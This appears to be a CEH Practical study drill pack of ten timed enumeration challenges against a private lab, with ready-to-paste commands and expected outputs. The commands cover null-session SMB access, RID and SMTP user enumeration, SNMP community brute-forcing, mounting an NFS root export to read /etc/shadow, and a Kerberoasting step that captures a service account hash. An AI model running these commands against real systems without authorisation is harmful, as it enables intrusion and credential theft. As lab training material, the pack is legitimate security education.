# Drill Pack 02 — Enumeration

> Deep, timed practice for turning open ports into a **named inventory** — shares, users, RIDs, SNMP configs, NFS exports, mail accounts, and directory objects. Each challenge mimics a CEH Practical question. Recipes live in [`../challenge-playbooks.md`](../challenge-playbooks.md) (see the *"Enumerate this service"* pattern); theory in [Module 04](../../modules/04-enumeration/). Answer from the tool output — expand the solution only if stuck.

> **Setup:** lab running ([`../../labs/README.md`](../../labs/README.md)). Metasploitable2 `192.168.56.20` (wide-open SMB / SNMP / SMTP / NFS), Windows DC `192.168.56.30` = `ceh.lab` (creds `jdoe` / `Passw0rd!`). Set both first so the commands paste clean:
> ```bash
> export T=192.168.56.20        # Metasploitable2
> export DC=192.168.56.30       # ceh.lab domain controller
> ```

Score each: **✅ under target / ⚠️ over time / ❌ needed the solution**. Re-drill anything not ✅.

---

### Challenge 1 — Name a readable SMB share on Metasploitable2 ⏱️ 5 min
**Q:** Using a null session (no credentials), name one non-hidden SMB share you can read on `$T`.
<details><summary>Solution</summary>

```bash
smbclient -L //$T -N                       # -N = null session, -L = list shares
nxc smb $T -u '' -p '' --shares            # NetExec: shares + your READ/WRITE access
```
You should see:
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
```
NetExec adds a `Permissions` column showing `READ,WRITE` next to `tmp`.

**Answer:** `tmp` (readable, and writable, over a null session).

⚡ **faster:** `nxc smb $T -u '' -p '' --shares` prints the share list *and* your access level in one green table — no second command needed to prove you can read it.
</details>

### Challenge 2 — Read a file from an anonymous share ⏱️ 7 min
**Q:** Connect to the `tmp` share on `$T` with no password and pull a file back to your box.
<details><summary>Solution</summary>

```bash
smbclient //$T/tmp -N
smb: \> ls                                 # list files in the share
smb: \> get <file> /tmp/loot               # download one
smb: \> put note.txt                        # world-writable: prove R/W if ls is empty
smb: \> exit
cat /tmp/loot
```
You should see the `smb: \>` prompt (anonymous login succeeded), a directory listing, then `getting file ... as /tmp/loot`.

**Answer:** the downloaded file's contents (the share is `/tmp` on the box, so contents vary — the point is that anonymous read/write succeeds).

⚡ **faster:** `smbclient //$T/tmp -N -c 'ls; get <file>'` runs the commands non-interactively — one line, no prompt.
</details>

### Challenge 3 — What is the username with RID 1001? ⏱️ 6 min
**Q:** Enumerate the accounts on `$T` and name the user whose RID is **1001** (`0x3e9`).
<details><summary>Solution</summary>

```bash
enum4linux-ng -A $T | less                 # -A = everything: users, RIDs, shares, policy
# or query RPC directly:
rpcclient -U "" -N $T
rpcclient $> enumdomusers                   # users + RIDs (hex)
```
You should see:
```
user:[games] rid:[0x3f7]
user:[root]  rid:[0x3e9]
user:[msfadmin] rid:[0xbb9]
user:[user]  rid:[0xbbb]
...
```
`0x3e9` = **1001**.

**Answer:** `root`.

⚡ **faster:** `rpcclient -U "" -N $T -c enumdomusers | grep 0x3e9` runs the query non-interactively and greps straight to RID 1001.
</details>

### Challenge 4 — What is the SNMP sysDescr of Metasploitable2? ⏱️ 5 min
**Q:** Read the `sysDescr.0` object from `$T` over SNMP. What string does it return?
<details><summary>Solution</summary>

```bash
snmpwalk -v2c -c public $T 1.3.6.1.2.1.1.1.0   # -v2c version 2c, -c public community string
snmpwalk -v2c -c public $T sysDescr.0           # same OID by name (needs MIBs installed)
```
You should see:
```
SNMPv2-MIB::sysDescr.0 = STRING: Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686
```
**Answer:** `Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686`

⚡ **faster:** query the single OID `sysDescr.0` instead of walking the whole MIB — one UDP packet, instant answer.
</details>

### Challenge 5 — Which SNMP community string is enabled? ⏱️ 6 min
**Q:** Without assuming the default, confirm which read community string `$T` accepts.
<details><summary>Solution</summary>

```bash
onesixtyone -c /usr/share/wordlists/snmp.txt $T   # brute common community strings
```
You should see:
```
192.168.56.20 [public] Linux metasploitable 2.6.24-16-server #1 SMP ...
```
The bracketed word is the working string.

**Answer:** `public` (default read-only community; `private` would be read-write).

⚡ **faster:** skip the brute — a single `snmpwalk -v2c -c public $T` both proves `public` works *and* dumps the whole MIB.
</details>

### Challenge 6 — Which directory is NFS-exported? ⏱️ 4 min
**Q:** List the NFS exports on `$T` and name the exported path and who it's offered to.
<details><summary>Solution</summary>

```bash
showmount -e $T                            # -e = list exports
```
You should see:
```
Export list for 192.168.56.20:
/ *
```
**Answer:** `/` — the entire root filesystem, exported to `*` (everyone).

⚡ **faster:** prove the impact directly: `sudo mount -t nfs $T:/ /mnt/nfs -o nolock && cat /mnt/nfs/etc/shadow` reads any file on the box, no credentials.
</details>

### Challenge 7 — Is user X a valid SMTP user? ⏱️ 6 min
**Q:** Using the SMTP service on `$T`, confirm whether `msfadmin` exists and that `nosuchuser` does not.
<details><summary>Solution</summary>

```bash
smtp-user-enum -M VRFY -u msfadmin -t $T                                   # single user
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $T  # bulk
# by hand:
nc -nv $T 25
VRFY msfadmin
VRFY nosuchuser
```
You should see:
```
252 2.0.0 msfadmin                                          => user exists
550 5.1.1 <nosuchuser>: Recipient address rejected: User unknown ...  => invalid
```
**Answer:** `msfadmin` is valid (`252`); `nosuchuser` is not (`550`). `root`, `postgres`, and `user` also validate.

⚡ **faster:** `smtp-user-enum -M VRFY -U unix_users.txt -t $T` sprays a whole list and prints only `exists` hits — build your `users.txt` for Module 06 from it.
</details>

### Challenge 8 — What is the LDAP base (naming context)? ⏱️ 4 min
**Q:** Ask the DC `$DC` for its directory base DN.
<details><summary>Solution</summary>

```bash
ldapsearch -x -H ldap://$DC -s base namingContexts        # -x anonymous, -s base = rootDSE
```
You should see:
```
namingContexts: DC=ceh,DC=lab
namingContexts: CN=Configuration,DC=ceh,DC=lab
namingContexts: CN=Schema,CN=Configuration,DC=ceh,DC=lab
```
**Answer:** `DC=ceh,DC=lab` (the default naming context / base DN).

⚡ **faster:** `ldapsearch -x -H ldap://$DC -s base defaultNamingContext` returns just the one line you want.
</details>

### Challenge 9 — List the domain's users ⏱️ 6 min
**Q:** Using the lab creds, list the user accounts in `ceh.lab` on `$DC`.
<details><summary>Solution</summary>

```bash
nxc smb $DC -u jdoe -p 'Passw0rd!' --users                # authenticated user dump
```
You should see:
```
SMB  192.168.56.30  445  DC01  [+] ceh.lab\jdoe:Passw0rd!
SMB  192.168.56.30  445  DC01  Administrator  ...
SMB  192.168.56.30  445  DC01  Guest / krbtgt / jdoe / svc-sql  ...
```
**Answer:** the domain account list — `Administrator, Guest, krbtgt, jdoe, svc-sql` (plus any others you created).

⚡ **faster:** if `--users` is blocked, `nxc smb $DC -u jdoe -p 'Passw0rd!' --rid-brute` walks RIDs from 500 automatically; `| tee dc-users.txt` saves the list for spraying.
</details>

### Challenge 10 — Find a Kerberoastable service account ⏱️ 7 min
**Q:** Which `ceh.lab` account has a servicePrincipalName (an SPN) — i.e. a Kerberoast target?
<details><summary>Solution</summary>

```bash
ldapsearch -x -H ldap://$DC -D "jdoe@ceh.lab" -w 'Passw0rd!' \
  -b "DC=ceh,DC=lab" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
# or, purpose-built:
impacket-GetUserSPNs ceh.lab/jdoe:'Passw0rd!' -dc-ip $DC
```
You should see:
```
sAMAccountName: svc-sql
servicePrincipalName: MSSQLSvc/dc01.ceh.lab:1433
```
**Answer:** `svc-sql` (SPN-bearing → Kerberoastable; feeds Drill 9 in [`../drills.md`](../drills.md)).

⚡ **faster:** `impacket-GetUserSPNs ceh.lab/jdoe:'Passw0rd!' -dc-ip $DC -request` lists the SPN account *and* grabs the roastable hash in one shot.
</details>

---

## Score yourself
- Log each challenge ✅ / ⚠️ / ❌ in [`../../PROGRESS.md`](../../PROGRESS.md); re-run every ⚠️/❌ until it's ✅ under time.
- **Speed gates:** SMB (1–3, 9) under ~6 min; SNMP/NFS/SMTP one-liners (4–7) under ~5 min; LDAP + SPN on the DC (8, 10) under ~7 min.
- **Build one artifact:** merge every name you pulled — Metasploitable2 users, SMTP-valid accounts, domain users — into a single `users.txt`; it feeds password attacks and the [capstone](../../labs/capstone.md). When all ten clear cold, you can turn *anonymous access* into a *named inventory* on demand — exactly what the Practical measures.

## Sources
- Challenge recipes: [`../challenge-playbooks.md`](../challenge-playbooks.md) · Course chapter: [`../../kali/06-enumeration.md`](../../kali/06-enumeration.md) · Theory: [Module 04](../../modules/04-enumeration/)
- NetExec (nxc) wiki — https://www.netexec.wiki/
- enum4linux-ng — https://github.com/cddmp/enum4linux-ng
- Samba (smbclient / rpcclient) — https://www.samba.org/
- Net-SNMP (snmpwalk) / onesixtyone — http://www.net-snmp.org/ · https://github.com/trailofbits/onesixtyone
- OpenLDAP (ldapsearch) — https://www.openldap.org/
- smtp-user-enum — https://github.com/pentestmonkey/smtp-user-enum
- showmount (nfs-utils) — https://linux-nfs.org/
- HackTricks — Pentesting SMB / SNMP / LDAP / NFS — https://book.hacktricks.xyz/
- MITRE ATT&CK: Account Discovery (T1087) — https://attack.mitre.org/techniques/T1087/
